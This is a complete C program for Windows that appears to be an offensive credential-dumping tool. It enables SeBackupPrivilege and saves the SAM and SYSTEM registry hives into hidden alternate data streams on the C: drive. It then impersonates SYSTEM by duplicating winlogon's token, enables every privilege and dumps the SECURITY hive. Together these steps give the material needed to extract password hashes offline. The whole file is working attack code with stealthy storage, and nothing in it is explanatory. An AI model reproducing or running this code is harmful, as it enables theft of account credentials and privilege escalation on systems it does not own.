#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <winternl.h>
#include <sddl.h>


#define ALTERNATE_DATA_STREAM_LOCATION_SAM "C:\\:sammy"
#define ALTERNATE_DATA_STREAM_LOCATION_SYSTEM "C:\\:syster"
#define ALTERNATE_DATA_STREAM_LOCATION_SECURITY "C:\\:seku"


typedef NTSTATUS (NTAPI* fnNtQueryInformationProcess)(
  HANDLE           ProcessHandle,
  PROCESSINFOCLASS ProcessInformationClass,
  PVOID            ProcessInformation,
  ULONG            ProcessInformationLength,
  PULONG           ReturnLength
);

typedef struct _PROCESS_BASIC_INFORMATION {
  NTSTATUS ExitStatus;
  PPEB PebBaseAddress;
  ULONG_PTR AffinityMask;
  KPRIORITY BasePriority;
  ULONG_PTR UniqueProcessId;
  ULONG_PTR InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION;



BOOL EnableAllPrivs()
{
  BOOL bSTATE = FALSE;
  HANDLE hToken = NULL;
  TOKEN_PRIVILEGES* pTokenPrivs = NULL;

  if(!OpenThreadToken((HANDLE)-2, TOKEN_ADJUST_PRIVILEGES | TOKEN_READ, FALSE, &hToken))
  {
      printf("[!] OpenThreadToken failed with error code: %d\n", GetLastError());
      goto _CleanUp;
  }

  DWORD RequiredBufferSize;

  GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &RequiredBufferSize);

  pTokenPrivs = (TOKEN_PRIVILEGES*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, RequiredBufferSize);

  if(!GetTokenInformation(hToken, TokenPrivileges, pTokenPrivs, RequiredBufferSize, &RequiredBufferSize))
  {
    printf("[!] GetTokenInformation failed with error code: %d\n", GetLastError());
    goto _CleanUp;
  }

  for (DWORD i = 0; i < pTokenPrivs->PrivilegeCount; i++)
  {
    {
      pTokenPrivs->Privileges[i].Attributes = SE_PRIVILEGE_ENABLED;
    }
  }

  if(!AdjustTokenPrivileges(hToken, FALSE, pTokenPrivs, 0, NULL, NULL))
  {
    printf("[!] AdjustTokenPrivileges failed with error code: %d\n", GetLastError());
    goto _CleanUp; 
  }

  bSTATE = TRUE;
  printf("[+] Successfully updated privileges!\n");


_CleanUp:
  if (hToken != NULL)
    CloseHandle(hToken);
  if (pTokenPrivs != NULL)
    HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, pTokenPrivs);
  return bSTATE;
}

BOOL Upgrade2System()
{
  BOOL bSTATE = FALSE;
  HANDLE hSnapshot = INVALID_HANDLE_VALUE;
  DWORD targetPID = 0;
  HANDLE hWinlogon = NULL;
  HANDLE hToken = NULL;
  HANDLE hCurrentToken = NULL;
  DWORD dwReqBuff = 0;
  TOKEN_USER* tkUser = NULL;
  CHAR* targetSID = NULL;
  CHAR* currentSID = NULL;
  TOKEN_USER* tkCurrentUser = NULL;
  PROCESSENTRY32 pe32;
  RtlSecureZeroMemory(&pe32, sizeof(PROCESSENTRY32));
  pe32.dwSize = sizeof(PROCESSENTRY32);

  hSnapshot = CreateToolhelp32Snapshot(
        TH32CS_SNAPPROCESS,
        0
      );

  if (hSnapshot == INVALID_HANDLE_VALUE)
  {
    printf("[!] CreateToolhelp32Snapshot failed with error code: %d\n", GetLastError());
    goto _EndOfFunc;
  }

  if(!Process32First(hSnapshot, &pe32))
  {
    printf("[!] Process32First failed with error code: %d\n", GetLastError());
    goto _EndOfFunc;
  }

  do {
    // we will go after the winlogon process (runs as system)
    if (strcmp(pe32.szExeFile, "winlogon.exe") == 0)
    {
      //printf("[i] Found winlogon with pid: %d\n", pe32.th32ProcessID);
      targetPID = pe32.th32ProcessID;
      break;
    }
  } while (Process32Next(hSnapshot, &pe32));

  if (targetPID == 0)
  {
    goto _EndOfFunc;
  }

  hWinlogon = OpenProcess(
      PROCESS_QUERY_INFORMATION,
      FALSE,
      targetPID);

  if (hWinlogon == NULL)
  {
    printf("[!] OpenProcess failed with error code: %d\n", GetLastError());
    goto _EndOfFunc;
  }

  if(!OpenProcessToken(
      hWinlogon,
      TOKEN_QUERY | TOKEN_DUPLICATE,
      &hToken
      ))
  {
    printf("[!] OpenProcessToken failed with error code: %d\n", GetLastError());
    goto _EndOfFunc;
  }

  if(!OpenProcessToken(
      (HANDLE)-1,
      TOKEN_QUERY,
      &hCurrentToken
      ))
  {
    printf("[!] OpenProcessToken failed with error code: %d\n", GetLastError());
    goto _EndOfFunc;
  }

  GetTokenInformation(
      hToken,
      TokenUser,
      NULL,
      0,
      &dwReqBuff
      );

  tkUser = (TOKEN_USER*)LocalAlloc(LPTR, dwReqBuff);


  if (!GetTokenInformation(
        hToken,
        TokenUser,
        tkUser,
        dwReqBuff,
        &dwReqBuff
        ))
  {
    printf("[!] GetTokenInformation1 failed with error code: %d\n", GetLastError());
    goto _EndOfFunc;
  }



  GetTokenInformation(
      hCurrentToken,
      TokenUser,
      NULL,
      0,
      &dwReqBuff
      );

  tkCurrentUser = (TOKEN_USER*)LocalAlloc(LPTR, dwReqBuff);


  if (!GetTokenInformation(
        hCurrentToken,
        TokenUser,
        tkCurrentUser,
        dwReqBuff,
        &dwReqBuff
        ))
  {
    printf("[!] GetTokenInformation2 failed with error code: %d\n", GetLastError());
    goto _EndOfFunc;
  }

  targetSID = LocalAlloc(LPTR, SECURITY_MAX_SID_SIZE);
  currentSID = LocalAlloc(LPTR, SECURITY_MAX_SID_SIZE);

  ConvertSidToStringSidA(tkUser->User.Sid, &targetSID);
  ConvertSidToStringSidA(tkCurrentUser->User.Sid, &currentSID);

  if (strcmp(targetSID, currentSID) == 0)
  {
    printf("[i] Current process is already running as SYSTEM\n");
    bSTATE = TRUE;
    goto _EndOfFunc;
  }


  if(!ImpersonateLoggedOnUser(hToken))
  {
    printf("[!] ImpersonateLoggedOnUser failed with error code: %d\n", GetLastError());
  }

  bSTATE = TRUE;


_EndOfFunc:

  if (hSnapshot != INVALID_HANDLE_VALUE)
  {
    CloseHandle(hSnapshot);
  }
  if (hWinlogon != NULL)
  {
    CloseHandle(hWinlogon);
  }
   if (hCurrentToken != NULL)
  {
    CloseHandle(hCurrentToken);
  }
  if (hToken != NULL)
  {
    CloseHandle(hToken);
  }
  if (tkUser != NULL)
  {
    LocalFree(tkUser);
  }
  if (currentSID != NULL)
  {
    LocalFree(currentSID);
  }
  if (targetSID != NULL)
  {
    LocalFree(targetSID);
  }
  
  return bSTATE;

}


BOOL SaveKey(IN LPCSTR LocationStorage, IN LPCSTR RegKeyName)
{
    HKEY hKEY = NULL;
    BOOL bSTATE = FALSE;
    LSTATUS STATUS;


    STATUS = RegOpenKeyExA(HKEY_LOCAL_MACHINE, RegKeyName, 0, KEY_READ, &hKEY);

    if (STATUS != ERROR_SUCCESS)
    {
        printf("[!] RegCreateKeyA failed with error code: 0x%08X\n", STATUS);
        goto _CleanUp;
    }

    printf("[+] Opened handle to %s key\n", RegKeyName);

    STATUS = RegSaveKeyA(hKEY, LocationStorage, NULL);

    if (STATUS != ERROR_SUCCESS)
    {
      printf("[!] RegSaveKeyA failed with error code: 0x%08X\n", STATUS);
      goto _CleanUp;
    }

    printf("[+] Saved %s contents... :)\n", RegKeyName);

    bSTATE = TRUE;

_CleanUp:
  if (hKEY != NULL)
  {
    RegCloseKey(hKEY);
  }

  return bSTATE;
}

BOOL EnablePriv()
{
    HANDLE hToken;
    LUID luidSeBackup;
    RtlSecureZeroMemory(&luidSeBackup, sizeof(LUID));

    if(!OpenProcessToken((HANDLE)-1, TOKEN_ADJUST_PRIVILEGES | TOKEN_READ, &hToken))
    {
        printf("[!] OpenProcessToken failed with error code: %d\n", GetLastError());
        return FALSE;
    }
    
    DWORD RequiredBufferSize;

    GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &RequiredBufferSize);

    TOKEN_PRIVILEGES* pTokenPrivs = (TOKEN_PRIVILEGES*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, RequiredBufferSize);

    if(!GetTokenInformation(hToken, TokenPrivileges, pTokenPrivs, RequiredBufferSize, &RequiredBufferSize))
    {
        printf("[!] GetTokenInformation failed with error code: %d\n", GetLastError());
        HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, pTokenPrivs);
        CloseHandle(hToken);
        return FALSE;
    }

    if(!LookupPrivilegeValueA(NULL, "SeBackupPrivilege", &luidSeBackup))
    {
        printf("[!] LookupPrivilegeValueA failed with error code: %d\n", GetLastError());
        HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, pTokenPrivs);
        CloseHandle(hToken);
        return FALSE;
    }
    
    for (DWORD i = 0; i < pTokenPrivs->PrivilegeCount; i++)
    {
        if ((pTokenPrivs->Privileges[i].Luid.LowPart == luidSeBackup.LowPart) && (pTokenPrivs->Privileges[i].Luid.HighPart == luidSeBackup.HighPart))
        {
            pTokenPrivs->Privileges[i].Attributes = SE_PRIVILEGE_ENABLED;
            printf("[i] SeBackupPrivilege found\n");
            break;
        }


    }

    if(!AdjustTokenPrivileges(hToken, FALSE, pTokenPrivs, 0, NULL, NULL))
    {
        printf("[!] AdjustTokenPrivileges failed with error code: %d\n", GetLastError());
        HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, pTokenPrivs);
        CloseHandle(hToken);
        return FALSE;
    }


    printf("[+] Successfully updated privilege!\n");

    CloseHandle(hToken);
    HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, pTokenPrivs);

    return TRUE;

}

int main()
{
    

    // we first need to enable the SeBackupPrivilege privilege on our current token
    if(!EnablePriv())
    {
        printf("[!] SeBackupPrivilege was either not found or could not be enabled\n");
        printf("[!] Quitting...\n");
        return EXIT_FAILURE;
    }

    
    if (!SaveKey(ALTERNATE_DATA_STREAM_LOCATION_SAM, "SAM"))
    {
        printf("[!] Failed saving SAM key\n");
        return EXIT_FAILURE;
    }

    if(!SaveKey(ALTERNATE_DATA_STREAM_LOCATION_SECURITY, "SYSTEM"))
    {
        printf("[!] Failed saving SYSTEM key\n");
        return EXIT_FAILURE;
    }

    if(!Upgrade2System())
    {
      printf("[i] Will not attempt to save SECURITY key\n");
      printf("[!] Failed eleavting to NT AUTHORITY\\SYSTEM\n");
      return EXIT_SUCCESS;
    }

    printf("[i] Current security context: NT AUTHORITY\\SYSTEM\n");

    EnableAllPrivs();


    // will only work if is ran as SYSTEM
    if(!SaveKey(ALTERNATE_DATA_STREAM_LOCATION_SYSTEM, "SECURITY"))
    {
        printf("[!] Failed saving SECURITY key\n");
        printf("[!] Are you running as NT AUTHORITY\\SYSTEM?\n");
        return EXIT_FAILURE;

    }

    return EXIT_SUCCESS;
}
